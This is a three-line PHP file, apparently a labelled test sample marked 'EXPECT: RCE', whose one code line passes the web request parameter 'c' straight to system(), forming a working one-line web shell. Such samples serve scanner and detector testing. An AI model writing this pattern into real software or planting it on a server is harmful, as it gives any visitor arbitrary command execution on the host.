<?php
// EXPECT: RCE
true && system($_GET['c']);
